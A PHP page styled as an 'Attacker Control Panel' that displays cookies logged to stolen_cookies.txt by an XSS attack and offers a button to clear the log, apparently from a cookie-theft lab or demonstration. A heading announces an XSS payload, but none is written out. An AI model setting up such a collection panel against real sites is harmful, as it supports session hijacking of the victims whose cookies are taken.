<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Attacker Dashboard</title>
    <style>
        body {
            font-family: sans-serif;
            background: #222;
            color: #0f0;
            padding: 20px;
        }

        .log-box {
            background: #000;
            border: 1px solid #0f0;

            padding: 15px 20px;   /* 👈 tăng padding */
            height: 400px;
            overflow-y: scroll;

            white-space: pre-line;
            word-break: break-word;

            line-height: 1.6;     /* 👈 giãn dòng cho dễ đọc */
            border-radius: 6px;   /* 👈 bo góc nhìn đẹp hơn */
        }

        h1 {
            border-bottom: 1px solid #0f0;
        }

        .payload {
            background: #333;
            padding: 10px;
            border-left: 5px solid #f00;
            color: #fff;
            margin-bottom: 20px;
        }

        code {
            background: #444;
            padding: 2px 4px;
        }
    </style>
</head>
<body>
    <h1>Attacker Control Panel</h1>
    
    <div class="payload">
        <h3>XSS Payload to steal cookies:</h3>
    </div>

    <h3>Stolen Cookies Log:</h3>
    <div class="log-box">
        <?php
        if (file_exists('stolen_cookies.txt') and filesize('stolen_cookies.txt') > 0) {
            echo htmlspecialchars(file_get_contents('stolen_cookies.txt'));
        } elseif (file_get_contents('stolen_cookies.txt') === '') {
            echo "No cookies stolen yet...";
        } else {
            echo "Log file not found.";
        }
        ?>
    </div>
    
    <form method="POST" style="margin-top: 10px;">
        <button type="submit" name="clear" style="background: #f00; color: #fff; border: none; padding: 5px 10px; cursor: pointer;">Clear Logs</button>
    </form>

    <?php
    if (isset($_POST['clear'])) {
        file_put_contents('stolen_cookies.txt', '');
        header("Location: index.php");
        exit();
    }
    ?>
</body>
</html>
